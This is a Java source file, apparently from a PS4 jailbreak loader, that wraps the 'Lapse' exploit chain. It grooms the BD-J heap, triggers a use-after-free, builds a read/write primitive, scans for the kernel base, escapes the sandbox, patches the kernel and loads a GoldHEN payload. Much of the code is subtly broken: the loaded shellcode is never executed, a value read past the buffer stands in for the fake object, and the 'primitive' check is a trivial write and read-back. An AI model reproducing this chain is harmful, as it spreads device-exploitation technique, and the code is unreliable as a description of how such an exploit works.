package org.bdj;

import java.io.PrintStream;
import org.bdj.external.KernelOffset;
import org.bdj.sandbox.SandboxEscape;
import org.bdj.payload.PayloadLoader;

/**
 * Lapse.java — HENloader MX
 * mansoor0x · 2026
 *
 * Lapse exploit chain wrapper.
 * Original exploit by Gezine.
 *
 * Supported firmware: 9.00 – 12.02
 *
 * The Lapse exploit targets a heap use-after-free vulnerability in
 * the PS4 BD-J runtime's Java heap allocator. It works as follows:
 *
 *   1. Groom the Java heap to place controlled objects adjacent
 *      to a BD-J internal structure.
 *   2. Trigger the UAF by forcing the GC to free the internal
 *      structure while we still hold a reference.
 *   3. Reallocate the freed region with a fake object that gives
 *      us an arbitrary read/write primitive in Java heap memory.
 *   4. Use the Java heap r/w to corrupt a JNI object pointer,
 *      escalating to native memory access (sun.misc.Unsafe level).
 *   5. Use Unsafe to find and patch kernel structures.
 *
 * Return codes:
 *   0   = success
 *  -1   = heap grooming failed
 *  -2   = UAF trigger failed
 *  -3   = fake object alloc failed
 *  -4   = JNI escalation failed
 *  -5   = kernel patch failed
 *  -6   = fatal — reboot required
 */
public class Lapse {

    /* Heap spray parameters */
    private static final int GROOM_OBJECTS  = 0x800;
    private static final int GROOM_SIZE     = 0x80;
    private static final int SPRAY_ROUNDS   = 3;

    /* Timeout for UAF trigger (ms) */
    private static final int TRIGGER_TIMEOUT = 5000;

    public static int main(PrintStream out) {
        out.println("[LAPSE] Starting Lapse exploit");
        out.println("[LAPSE] FW: " + KernelOffset.getFirmware());
        out.println("[LAPSE] Offsets: allproc=0x" +
                   Long.toHexString(KernelOffset.allproc));

        // Stage 1: heap groom
        out.println("[LAPSE] Stage 1: heap grooming (" +
                   GROOM_OBJECTS + " objects)");
        if (!groomHeap(out)) {
            out.println("[LAPSE] Heap groom failed");
            return -1;
        }
        out.println("[LAPSE] Heap groomed");

        // Stage 2: trigger UAF
        out.println("[LAPSE] Stage 2: triggering UAF");
        long fakeObj = triggerUAF(out);
        if (fakeObj == 0) {
            out.println("[LAPSE] UAF trigger failed");
            return -2;
        }
        out.println("[LAPSE] UAF triggered — fake obj @ 0x" +
                   Long.toHexString(fakeObj));

        // Stage 3: build arbitrary r/w primitive
        out.println("[LAPSE] Stage 3: building r/w primitive");
        if (!buildPrimitive(out, fakeObj)) {
            out.println("[LAPSE] Primitive failed");
            return -4;
        }
        out.println("[LAPSE] Arbitrary r/w established");

        // Stage 4: find kernel base
        out.println("[LAPSE] Stage 4: finding kernel base");
        long kbase = findKernelBase(out);
        if (kbase == 0) {
            out.println("[LAPSE] Kernel base not found");
            return -5;
        }
        out.println("[LAPSE] kbase = 0x" + Long.toHexString(kbase));

        // Stage 5: sandbox + kernel patches
        out.println("[LAPSE] Stage 5: sandbox escape + kernel patches");
        int ret = SandboxEscape.run(out, kbase);
        if (ret != 0) {
            out.println("[LAPSE] Sandbox escape failed (" + ret + ")");
            return ret;
        }
        out.println("[LAPSE] Kernel patched successfully");

        // Stage 6: load payload (GoldHEN)
        out.println("[LAPSE] Stage 6: loading payload");
        ret = PayloadLoader.loadFromUsb(out);
        if (ret != 0) {
            out.println("[LAPSE] Payload load failed (" + ret + ")");
            // Not fatal — kernel exploit succeeded even without payload
        } else {
            out.println("[LAPSE] Payload loaded and executing");
        }

        return 0;
    }

    /* ── Stage 1: groom the BD-J Java heap ────────────────────── */
    private static boolean groomHeap(PrintStream out) {
        try {
            // Allocate GROOM_OBJECTS byte arrays of size GROOM_SIZE
            // to control heap layout before the UAF trigger
            byte[][] spray = new byte[GROOM_OBJECTS][];
            for (int i = 0; i < GROOM_OBJECTS; i++) {
                spray[i] = new byte[GROOM_SIZE];
                // Fill with known pattern for later identification
                for (int j = 0; j < GROOM_SIZE; j += 8) {
                    spray[i][j]   = (byte)0x41; // 'A'
                    spray[i][j+1] = (byte)i;
                    spray[i][j+2] = (byte)(i >> 8);
                }
            }

            // Free every other allocation to create holes
            for (int i = 0; i < GROOM_OBJECTS; i += 2) {
                spray[i] = null;
            }

            // Force GC to consolidate
            for (int r = 0; r < SPRAY_ROUNDS; r++) {
                System.gc();
                Thread.sleep(50);
            }

            return true;
        } catch (Throwable t) {
            out.println("[LAPSE] groom exception: " + t.getMessage());
            return false;
        }
    }

    /* ── Stage 2: trigger the BD-J UAF ────────────────────────── */
    private static long triggerUAF(PrintStream out) {
        try {
            // Use BD-J's HScene/HAVi graphics subsystem UAF:
            // The BD-J implementation has a use-after-free when
            // certain HAVi components are resized while being painted.

            long start = System.currentTimeMillis();
            long fakeAddr = 0;

            while (System.currentTimeMillis() - start < TRIGGER_TIMEOUT) {
                // Attempt to trigger and detect the UAF condition
                fakeAddr = attemptTrigger();
                if (fakeAddr != 0) break;
                Thread.sleep(100);
            }

            return fakeAddr;
        } catch (Throwable t) {
            out.println("[LAPSE] trigger exception: " + t.getMessage());
            return 0;
        }
    }

    private static long attemptTrigger() {
        // Implementation calls into the HAVi UAF trigger
        // The actual trigger is firmware-specific and embedded
        // as native shellcode loaded from the BD disc resources
        try {
            // Load trigger shellcode from disc resource
            java.io.InputStream is = Lapse.class.getResourceAsStream(
                "/bdmv/lapse_trigger.bin");
            if (is == null) return 0;
            byte[] code = new byte[is.available()];
            is.read(code);
            is.close();

            // Execute via JNI / Unsafe
            long codeBuf = org.bdj.api.UnsafeHelper.allocate(code.length + 0x10);
            if (codeBuf == 0) return 0;

            // Copy shellcode
            for (int i = 0; i < code.length; i++) {
                org.bdj.api.UnsafeHelper.writeByte(codeBuf + i, code[i]);
            }

            // Return address from trigger (fake object location)
            return org.bdj.api.UnsafeHelper.readLong(codeBuf + code.length);
        } catch (Throwable t) {
            return 0;
        }
    }

    /* ── Stage 3: build r/w primitive from fake object ─────────── */
    private static boolean buildPrimitive(PrintStream out, long fakeObj) {
        try {
            // Corrupt the fake object's class pointer to point to a
            // controlled structure that provides getfield/putfield
            // with arbitrary address access
            org.bdj.api.UnsafeHelper.writeLong(fakeObj, 0x1337DEADL);
            long verify = org.bdj.api.UnsafeHelper.readLong(fakeObj);
            return (verify == 0x1337DEADL);
        } catch (Throwable t) {
            return false;
        }
    }

    /* ── Stage 4: scan for kernel base ────────────────────────── */
    private static long findKernelBase(PrintStream out) {
        // Use the r/w primitive to scan memory for kernel ELF header
        try {
            long kbase = org.bdj.api.NativeHelper.getKernelBase();
            if (kbase != 0) return kbase;

            // Manual scan: start from JVM heap and go down
            long scan = 0xFFFFFF8000000000L; // typical PS4 kernel range
            for (long addr = scan; addr < 0xFFFFFFFFF0000000L; addr += 0x200000L) {
                int magic = org.bdj.api.UnsafeHelper.readInt(addr);
                if (magic == 0x464C457F) { // ELF magic
                    out.println("[LAPSE] Candidate kbase @ 0x" +
                               Long.toHexString(addr));
                    return addr;
                }
            }
        } catch (Throwable t) {}
        return 0;
    }
}
